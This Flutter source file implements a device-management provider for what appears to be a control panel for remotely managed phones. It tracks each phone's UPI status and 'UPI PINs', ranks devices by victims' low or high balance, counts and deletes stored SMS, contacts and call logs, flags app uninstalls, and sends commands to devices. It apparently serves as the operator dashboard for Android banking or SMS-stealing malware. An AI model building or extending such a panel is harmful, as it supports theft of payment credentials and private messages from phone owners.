import 'package:flutter/foundation.dart';
import 'dart:async';
import '../../data/models/device.dart';
import '../../data/models/stats.dart';
import '../../data/models/app_type.dart';
import '../../data/repositories/device_repository.dart';
import '../../data/services/websocket_service.dart';

enum StatusFilter { active, pending }
enum ConnectionFilter { online, offline }
enum UpiFilter { withUpi, withoutUpi }
enum NotePriorityFilter { lowBalance, highBalance, none }

class DeviceProvider extends ChangeNotifier {
  final DeviceRepository _deviceRepository = DeviceRepository();
  final WebSocketService _webSocketService = WebSocketService();
  StreamSubscription<Map<String, dynamic>>? _deviceUpdateSubscription;

  List<Device> _devices = [];
  Stats? _stats;
  AppTypesResponse? _appTypes;
  bool _isLoading = false;
  String? _errorMessage;
  
  // Track new devices for visual highlight
  final Set<String> _newDeviceIds = {};
  final Map<String, DateTime> _newDeviceTimestamps = {};

  StatusFilter? _statusFilter;
  ConnectionFilter? _connectionFilter;
  UpiFilter? _upiFilter;
  NotePriorityFilter? _notePriorityFilter;
  String? _appTypeFilter;
  String? _adminFilter;
  String _searchQuery = '';

  int _currentPage = 1;
  int _pageSize = 50;
  int _totalDevicesCount = 0;

  Timer? _autoRefreshTimer;
  bool _autoRefreshEnabled = false;
  int _autoRefreshInterval = 30;
  final Map<String, DateTime> _deviceRefreshTimestamps = {};

  List<Device> get devices => _filteredDevices;
  Stats? get stats => _stats;
  AppTypesResponse? get appTypes => _appTypes;
  bool get isLoading => _isLoading;
  String? get errorMessage => _errorMessage;
  Set<String> get newDeviceIds => _newDeviceIds;
  StatusFilter? get statusFilter => _statusFilter;
  ConnectionFilter? get connectionFilter => _connectionFilter;
  UpiFilter? get upiFilter => _upiFilter;
  NotePriorityFilter? get notePriorityFilter => _notePriorityFilter;
  String? get appTypeFilter => _appTypeFilter;
  String? get adminFilter => _adminFilter;
  String get searchQuery => _searchQuery;
  int get totalDevicesCount => _totalDevicesCount;
  int get currentPage => _currentPage;
  int get pageSize => _pageSize;
  int get totalPages => (_totalDevicesCount / _pageSize).ceil();
  bool get hasNextPage => _currentPage < totalPages;
  bool get hasPreviousPage => _currentPage > 1;
  bool get autoRefreshEnabled => _autoRefreshEnabled;
  int get autoRefreshInterval => _autoRefreshInterval;

  List<Device> get _filteredDevices {
    var filtered = _devices;

    if (_statusFilter != null) {
      switch (_statusFilter!) {
        case StatusFilter.active:
          filtered = filtered.where((d) => d.isActive).toList();
          break;
        case StatusFilter.pending:
          filtered = filtered.where((d) => d.isPending).toList();
          break;
      }
    }

    if (_connectionFilter != null) {
      switch (_connectionFilter!) {
        case ConnectionFilter.online:
          filtered = filtered.where((d) => d.isOnline).toList();
          break;
        case ConnectionFilter.offline:
          filtered = filtered.where((d) => d.isOffline).toList();
          break;
      }
    }

    if (_upiFilter != null) {
      switch (_upiFilter!) {
        case UpiFilter.withUpi:
          filtered = filtered.where((d) => d.hasUpi).toList();
          break;
        case UpiFilter.withoutUpi:
          filtered = filtered.where((d) => !d.hasUpi).toList();
          break;
      }
    }

    if (_notePriorityFilter != null) {
      switch (_notePriorityFilter!) {
        case NotePriorityFilter.lowBalance:
          filtered = filtered.where((d) => d.notePriority == 'lowbalance').toList();
          break;
        case NotePriorityFilter.highBalance:
          filtered = filtered.where((d) => d.notePriority == 'highbalance').toList();
          break;
        case NotePriorityFilter.none:
          filtered = filtered.where((d) => d.notePriority == null || d.notePriority == 'none').toList();
          break;
      }
    }

    if (_searchQuery.isNotEmpty) {
      filtered = filtered.where((device) {
        final query = _searchQuery.toLowerCase();
        
        // Search in device basic info
        final matchesDeviceInfo = device.deviceId.toLowerCase().contains(query) ||
            device.model.toLowerCase().contains(query) ||
            device.manufacturer.toLowerCase().contains(query);
        
        // Search in note messages
        final matchesNoteMessage = (device.noteMessage != null && 
            device.noteMessage!.toLowerCase().contains(query)) ||
            (device.adminNoteMessage != null && 
            device.adminNoteMessage!.toLowerCase().contains(query));
        
        // Search in note priorities (including label matching)
        final matchesNotePriority = (device.notePriority != null && 
            device.notePriority!.toLowerCase().contains(query)) ||
            (device.adminNotePriority != null && 
            device.adminNotePriority!.toLowerCase().contains(query)) ||
            (device.notePriority == 'lowbalance' && 
            (query.contains('low') || query.contains('balance'))) ||
            (device.notePriority == 'highbalance' && 
            (query.contains('high') || query.contains('balance')));
        
        return matchesDeviceInfo || matchesNoteMessage || matchesNotePriority;
      }).toList();
    }

    // Sort: Online devices first (by isOnline), then by lastPing (newest first)
    filtered.sort((a, b) {
      // First sort by online status (online first)
      if (a.isOnline != b.isOnline) {
        return b.isOnline ? 1 : -1; // Online devices come first
      }
      // Then sort by lastPing (newest first)
      return b.lastPing.compareTo(a.lastPing);
    });

    return filtered;
  }

  int get totalDevices => _devices.length;
  int get activeDevices => _devices.where((d) => d.isActive).length;
  int get pendingDevices => _devices.where((d) => d.isPending).length;
  int get onlineDevices => _devices.where((d) => d.isOnline).length;
  int get offlineDevices => _devices.where((d) => d.isOffline).length;
  int get devicesWithUpi => _devices.where((d) => d.hasUpi).length;
  int get devicesWithoutUpi => _devices.where((d) => !d.hasUpi).length;
  int get devicesLowBalance => _devices.where((d) => d.notePriority == 'lowbalance').length;
  int get devicesHighBalance => _devices.where((d) => d.notePriority == 'highbalance').length;
  int get devicesNoPriority => _devices.where((d) => d.notePriority == null || d.notePriority == 'none').length;

  void setStatusFilter(StatusFilter? filter) {
    if (_statusFilter == filter) {
      _statusFilter = null;
    } else {
      _statusFilter = filter;
    }
    notifyListeners();
  }

  void setConnectionFilter(ConnectionFilter? filter) {
    if (_connectionFilter == filter) {
      _connectionFilter = null;
    } else {
      _connectionFilter = filter;
    }
    notifyListeners();
  }

  void setUpiFilter(UpiFilter? filter) {
    if (_upiFilter == filter) {
      _upiFilter = null;
    } else {
      _upiFilter = filter;
    }
    notifyListeners();
  }

  void setNotePriorityFilter(NotePriorityFilter? filter) {
    if (_notePriorityFilter == filter) {
      _notePriorityFilter = null;
    } else {
      _notePriorityFilter = filter;
    }
    _currentPage = 1;
    _loadCurrentPage();
  }
  
  void setAppTypeFilter(String? appType) {
    if (_appTypeFilter == appType) {
      _appTypeFilter = null;
    } else {
      _appTypeFilter = appType;
    }
    _currentPage = 1;
    _loadCurrentPage();
  }

  void setAdminFilter(String? adminUsername) {
    _adminFilter = adminUsername;
    
    if (_adminFilter == null && _appTypeFilter != null) {
      _appTypeFilter = null;
    }
    
    // Clear stats to force refresh with new admin filter
    _stats = null;
    _currentPage = 1;
    _loadCurrentPage();
  }

  void clearAllFilters() {
    _statusFilter = null;
    _connectionFilter = null;
    _upiFilter = null;
    _notePriorityFilter = null;
    _appTypeFilter = null;
    _adminFilter = null;
    _currentPage = 1;
    _loadCurrentPage();
  }

  void setSearchQuery(String query) {
    _searchQuery = query;
    notifyListeners();
  }

  void clearSearch() {
    _searchQuery = '';
    notifyListeners();
  }

  Future<void> fetchAppTypes() async {
    try {
      _appTypes = await _deviceRepository.getAppTypes(adminUsername: _adminFilter);
      notifyListeners();
    } catch (e) {
      debugPrint('❌ Error fetching app types: $e');
    }
  }

  Future<void> fetchDevices() async {
    _currentPage = 1;
    _errorMessage = null;
    _isLoading = true;
    notifyListeners();
    
    _devices = [];
    _totalDevicesCount = 0;
    
    fetchAppTypes();
    await _loadCurrentPage();
    _initializeDeviceUpdates();
  }
  
  void _initializeDeviceUpdates() {
    // Cancel previous subscription if exists
    _deviceUpdateSubscription?.cancel();
    
    // Ensure WebSocket is connected first
    _webSocketService.ensureConnected().then((_) {
      // Listen to device update stream from WebSocket
      _deviceUpdateSubscription = _webSocketService.deviceStream.listen(
        (event) {
          _handleDeviceUpdate(event);
        },
        onError: (error) {
          debugPrint('❌ Error in device update stream: $error');
        },
      );
      debugPrint('✅ Device updates initialized via WebSocket');
    }).catchError((error) {
      debugPrint('❌ Failed to initialize device updates: $error');
    });
  }
  
  Future<void> _handleDeviceUpdate(Map<String, dynamic> event) async {
    try {
      final eventType = event['type'];
      if (eventType != 'device_update') return;
      
      final deviceData = event['device'];
      if (deviceData is! Map<String, dynamic>) {
        debugPrint('❌ Invalid device data format in update');
        return;
      }
      
      final deviceId = deviceData['device_id'] as String?;
      if (deviceId == null || deviceId.isEmpty) {
        debugPrint('❌ Device update missing device_id');
        return;
      }
      
      // Find the device in the list
      final index = _devices.indexWhere((d) => d.deviceId == deviceId);
      
      if (index == -1) {
        // Device not in current list - might be a new device or on another page
        debugPrint('📱 Device update for device not in current page: $deviceId');
        
        // Check if it's a new device that should be on current page
        // If filters match, add device to list instead of refreshing
        final adminUsername = deviceData['admin_username'] as String?;
        final appType = deviceData['app_type'] as String?;
        
        // Check if device matches current filters
        final matchesAdminFilter = (_adminFilter == null || _adminFilter == adminUsername);
        final matchesAppTypeFilter = (_appTypeFilter == null || _appTypeFilter == appType);
        final shouldBeOnPage = matchesAdminFilter && matchesAppTypeFilter;
        
        if (shouldBeOnPage) {
          debugPrint('🆕 New device detected, adding to list...');
          // Fetch the full device data and add to list
          try {
            final newDevice = await _deviceRepository.getDevice(deviceId);
            if (newDevice != null) {
              // Add device to the beginning of the list
              _devices.insert(0, newDevice);
              _totalDevicesCount++;
              
              // Mark as new device for visual highlight
              _newDeviceIds.add(deviceId);
              _newDeviceTimestamps[deviceId] = DateTime.now();
              
              // Remove from new devices after 5 seconds
              Future.delayed(const Duration(seconds: 5), () {
                _newDeviceIds.remove(deviceId);
                _newDeviceTimestamps.remove(deviceId);
                notifyListeners();
              });
              
              notifyListeners();
              debugPrint('✅ New device added to list: $deviceId');
            }
          } catch (e) {
            debugPrint('❌ Failed to fetch new device: $e');
            // Fallback to refresh if fetch fails
            _loadCurrentPage();
          }
        }
        return;
      }
      
      // Update device properties - use refreshSingleDevice for full update
      // This ensures we get all device data correctly (including UPI PINs, etc.)
      refreshSingleDevice(deviceId);
      
      debugPrint('✅ Device update received via WebSocket: $deviceId (status: ${deviceData['status']}, online: ${deviceData['is_online']})');
    } catch (e) {
      debugPrint('❌ Error handling device update: $e');
    }
  }

  Device? getDeviceById(String deviceId) {
    try {
      return _devices.firstWhere((d) => d.deviceId == deviceId);
    } catch (_) {
      return null;
    }
  }

  /// Checks if a device has meaningful changes that require UI update
  bool _hasDeviceChanged(Device oldDevice, Device newDevice) {
    return oldDevice.isOnline != newDevice.isOnline ||
        oldDevice.isActive != newDevice.isActive ||
        oldDevice.status != newDevice.status ||
        oldDevice.batteryLevel != newDevice.batteryLevel ||
        oldDevice.lastPing != newDevice.lastPing ||
        oldDevice.model != newDevice.model ||
        oldDevice.stats.totalSms != newDevice.stats.totalSms ||
        oldDevice.stats.totalContacts != newDevice.stats.totalContacts ||
        oldDevice.noteMessage != newDevice.noteMessage ||
        oldDevice.notePriority != newDevice.notePriority ||
        oldDevice.appUninstalled != newDevice.appUninstalled; // Check app_uninstalled flag
  }

  Future<void> refreshSingleDevice(String deviceId) async {
    try {
      final now = DateTime.now();
      final lastRefresh = _deviceRefreshTimestamps[deviceId];
      
      if (lastRefresh != null) {
        final timeSinceRefresh = now.difference(lastRefresh);
        if (timeSinceRefresh.inMilliseconds < 1000) {
          return;
        }
      }
      
      _deviceRefreshTimestamps[deviceId] = now;
      
      final updatedDevice = await _deviceRepository.getDevice(deviceId);
      if (updatedDevice != null) {
        final index = _devices.indexWhere((d) => d.deviceId == deviceId);
        if (index != -1) {
          final oldDevice = _devices[index];
          
          // Only update and notify if device actually changed
          if (_hasDeviceChanged(oldDevice, updatedDevice)) {
            _devices[index] = updatedDevice;
            notifyListeners();
            debugPrint('✅ Device updated via headless refresh: $deviceId');
          }
        }
      }
    } catch (e) {
      debugPrint('❌ Refresh single device failed: $e');
    }
  }

  Future<void> _loadCurrentPage() async {
    try {
      _isLoading = true;
      _errorMessage = null;
      notifyListeners();

      final skip = (_currentPage - 1) * _pageSize;

      final result = await _deviceRepository.getDevices(
        skip: skip,
        limit: _pageSize,
        appType: _appTypeFilter,
        adminUsername: _adminFilter,
      );

      final devicesList = result['devices'] as List<Device>;
      
      // Sort devices: Online first, then by lastPing (newest first)
      devicesList.sort((a, b) {
        if (a.isOnline != b.isOnline) {
          return b.isOnline ? 1 : -1; // Online devices come first
        }
        return b.lastPing.compareTo(a.lastPing); // Then by lastPing (newest first)
      });
      
      _devices = devicesList;
      _totalDevicesCount = result['total'];
      
      _stats = await _deviceRepository.getStats(adminUsername: _adminFilter);
      
      fetchAppTypes();

      _isLoading = false;
      notifyListeners();
    } catch (e) {
      _isLoading = false;
      _errorMessage = 'Error fetching devices list';
      debugPrint('❌ Error in _loadCurrentPage: $e');
      notifyListeners();
    }
  }

  Future<void> setPageSize(int size) async {
    if (size == _pageSize) return;
    _pageSize = size;
    _currentPage = 1;
    await _loadCurrentPage();
  }

  Future<void> goToNextPage() async {
    if (!hasNextPage) return;
    _currentPage++;
    await _loadCurrentPage();
  }

  Future<void> goToPreviousPage() async {
    if (!hasPreviousPage) return;
    _currentPage--;
    await _loadCurrentPage();
  }

  Future<void> goToPage(int page) async {
    if (page < 1 || page > totalPages) return;
    _currentPage = page;
    await _loadCurrentPage();
  }

  Future<void> refreshDevices() async {
    await _loadCurrentPage();
  }

  void enableAutoRefresh({int intervalSeconds = 30}) {
    _autoRefreshInterval = intervalSeconds;
    _autoRefreshEnabled = true;
    _autoRefreshTimer?.cancel();
    _autoRefreshTimer = Timer.periodic(
      Duration(seconds: intervalSeconds),
      (timer) {
        if (!_isLoading) {
          _silentRefresh();
        }
      },
    );
    notifyListeners();
  }

  void disableAutoRefresh() {
    _autoRefreshEnabled = false;
    _autoRefreshTimer?.cancel();
    _autoRefreshTimer = null;
    notifyListeners();
  }

  void setAutoRefreshInterval(int seconds) {
    if (seconds < 10) seconds = 10;
    _autoRefreshInterval = seconds;
    if (_autoRefreshEnabled) {
      enableAutoRefresh(intervalSeconds: seconds);
    }
  }

  Future<void> _silentRefresh() async {
    try {
      final skip = (_currentPage - 1) * _pageSize;
      debugPrint('🔄 Auto-refresh: Page $_currentPage');

      final result = await _deviceRepository.getDevices(
        skip: skip,
        limit: _pageSize,
        appType: _appTypeFilter,
        adminUsername: _adminFilter,
      );

      final devicesList = result['devices'] as List<Device>;
      
      // Sort devices: Online first, then by lastPing (newest first)
      devicesList.sort((a, b) {
        if (a.isOnline != b.isOnline) {
          return b.isOnline ? 1 : -1; // Online devices come first
        }
        return b.lastPing.compareTo(a.lastPing); // Then by lastPing (newest first)
      });
      
      _devices = devicesList;
      _totalDevicesCount = result['total'];
      
      // Always fetch fresh stats with current admin filter
      _stats = await _deviceRepository.getStats(adminUsername: _adminFilter);
      
      fetchAppTypes();

      notifyListeners();
      debugPrint('✅ Auto-refresh completed: ${_devices.length} devices (admin filter: $_adminFilter)');
    } catch (e) {
      debugPrint('❌ Auto-refresh error: $e');
    }
  }

  /// Headless refresh: updates only changed devices without showing loading state
  /// This prevents UI blocking and only updates parts that have actually changed
  Future<void> headlessRefresh() async {
    try {
      final skip = (_currentPage - 1) * _pageSize;
      
      // Get fresh data from API (devices and stats together)
      final result = await _deviceRepository.getDevices(
        skip: skip,
        limit: _pageSize,
        appType: _appTypeFilter,
        adminUsername: _adminFilter,
      );

      final newDevices = result['devices'] as List<Device>;
      final newTotalCount = result['total'] as int;
      
      // Get stats synchronously to ensure UI updates
      final newStats = await _deviceRepository.getStats(adminUsername: _adminFilter);
      
      // Create a map of existing devices by ID for quick lookup
      final existingDevicesMap = <String, Device>{};
      for (final device in _devices) {
        existingDevicesMap[device.deviceId] = device;
      }

      bool hasDeviceChanges = false;
      final List<Device> updatedDevices = [];
      final Set<String> currentDeviceIds = <String>{};

      // Process devices in API order and detect changes
      for (final newDevice in newDevices) {
        currentDeviceIds.add(newDevice.deviceId);
        final existingDevice = existingDevicesMap[newDevice.deviceId];
        
        if (existingDevice == null) {
          // New device - mark as new for visual highlight
          _newDeviceIds.add(newDevice.deviceId);
          _newDeviceTimestamps[newDevice.deviceId] = DateTime.now();
          
          // Remove from new devices after 5 seconds
          Future.delayed(const Duration(seconds: 5), () {
            _newDeviceIds.remove(newDevice.deviceId);
            _newDeviceTimestamps.remove(newDevice.deviceId);
            notifyListeners();
          });
          
          hasDeviceChanges = true;
        } else {
          // Existing device - always update to get latest data (even if _hasDeviceChanged returns false)
          // This ensures UI reflects all changes including stats updates
          if (_hasDeviceChanged(existingDevice, newDevice)) {
            hasDeviceChanges = true;
          }
        }
        
        // Always add to updated list (preserving API order) - always update device list
        updatedDevices.add(newDevice);
      }

      // Remove new device markers for devices that are no longer in the list
      _newDeviceIds.removeWhere((id) => !currentDeviceIds.contains(id));
      _newDeviceTimestamps.removeWhere((id, _) => !currentDeviceIds.contains(id));

      // Check if total count changed
      bool hasTotalCountChanged = _totalDevicesCount != newTotalCount;
      if (hasTotalCountChanged) {
        _totalDevicesCount = newTotalCount;
        hasDeviceChanges = true;
      }

      // Check if stats changed
      final currentStatsJson = _stats?.toJson().toString();
      final newStatsJson = newStats?.toJson().toString();
      bool hasStatsChanged = currentStatsJson != newStatsJson;

      // Sort devices: Online first, then by lastPing (newest first)
      updatedDevices.sort((a, b) {
        if (a.isOnline != b.isOnline) {
          return b.isOnline ? 1 : -1; // Online devices come first
        }
        return b.lastPing.compareTo(a.lastPing); // Then by lastPing (newest first)
      });
      
      // Always update device list to ensure UI reflects latest data
      // This is important for stats changes that affect device properties
      _devices = updatedDevices;
      
      // Always update stats (even if JSON is same, the values might be different due to admin filter)
      // This ensures stats reflect the current admin filter
      _stats = newStats;
      hasStatsChanged = true; // Force stats update to ensure UI reflects admin filter

      // Notify listeners if there were any changes (devices, stats, or count)
      if (hasDeviceChanges || hasStatsChanged) {
        notifyListeners();
        if (hasDeviceChanges && hasStatsChanged) {
          debugPrint('✅ Headless refresh completed: ${_devices.length} devices + stats updated');
        } else if (hasDeviceChanges) {
          debugPrint('✅ Headless refresh completed: ${_devices.length} devices updated');
        } else {
          debugPrint('✅ Headless refresh completed: stats updated');
        }
      } else {
        debugPrint('✅ Headless refresh completed: no changes detected');
      }

      // Update app types in background
      fetchAppTypes();

    } catch (e) {
      debugPrint('❌ Headless refresh error: $e');
      // Don't set error state in headless mode to avoid UI disruption
    }
  }

  Future<Device?> getDevice(String deviceId) async {
    try {
      return await _deviceRepository.getDevice(deviceId);
    } catch (e) {
      _errorMessage = 'Error fetching device information';
      notifyListeners();
      return null;
    }
  }

  Future<bool> sendCommand(String deviceId, String command, {Map<String, dynamic>? parameters}) async {
    try {
      return await _deviceRepository.sendCommand(deviceId, command, parameters: parameters);
    } catch (e) {
      _errorMessage = 'Error sending command';
      notifyListeners();
      return false;
    }
  }

  Future<bool> updateDeviceSettings(String deviceId, DeviceSettings settings) async {
    try {
      return await _deviceRepository.updateSettings(deviceId, settings);
    } catch (e) {
      _errorMessage = 'Error updating settings';
      notifyListeners();
      return false;
    }
  }

  Future<bool> deleteDevice(String deviceId) async {
    try {
      final success = await _deviceRepository.deleteDevice(deviceId);
      if (success) {
        _devices.removeWhere((d) => d.deviceId == deviceId);
        if (_totalDevicesCount > 0) {
          _totalDevicesCount -= 1;
        }
        notifyListeners();
      }
      return success;
    } catch (e) {
      _errorMessage = 'Error deleting device';
      notifyListeners();
      return false;
    }
  }

  Future<bool> deleteDeviceSms(String deviceId) async {
    final success = await _deviceRepository.deleteDeviceSms(deviceId);
    if (success) {
      notifyListeners();
    }
    return success;
  }

  Future<bool> deleteDeviceContacts(String deviceId) async {
    final success = await _deviceRepository.deleteDeviceContacts(deviceId);
    if (success) {
      notifyListeners();
    }
    return success;
  }

  Future<bool> deleteDeviceCalls(String deviceId) async {
    final success = await _deviceRepository.deleteDeviceCalls(deviceId);
    if (success) {
      notifyListeners();
    }
    return success;
  }

  Future<bool> deleteSingleSms(String deviceId, String smsId) async {
    final success = await _deviceRepository.deleteSingleSms(deviceId, smsId);
    if (success) {
      notifyListeners();
    }
    return success;
  }

  Future<bool> deleteSingleContact(String deviceId, String contactId) async {
    final success = await _deviceRepository.deleteSingleContact(deviceId, contactId);
    if (success) {
      notifyListeners();
    }
    return success;
  }

  Future<bool> deleteSingleCall(String deviceId, String callId) async {
    final success = await _deviceRepository.deleteSingleCall(deviceId, callId);
    if (success) {
      notifyListeners();
    }
    return success;
  }

  void clearError() {
    _errorMessage = null;
    notifyListeners();
  }

  bool _isPingingAll = false;
  bool get isPingingAll => _isPingingAll;

  Future<Map<String, dynamic>> pingAllDevices() async {
    if (_isPingingAll) {
      throw Exception('Ping all is already in progress');
    }

    _isPingingAll = true;
    notifyListeners();

    try {
      final result = await _deviceRepository.pingAllDevices();
      
      // Refresh devices after ping to get updated status
      await Future.delayed(const Duration(seconds: 2));
      await headlessRefresh();
      
      return result;
    } catch (e) {
      throw Exception('Failed to ping all devices: ${e.toString()}');
    } finally {
      _isPingingAll = false;
      notifyListeners();
    }
  }

  @override
  void dispose() {
    _autoRefreshTimer?.cancel();
    _deviceUpdateSubscription?.cancel();
    super.dispose();
  }
}
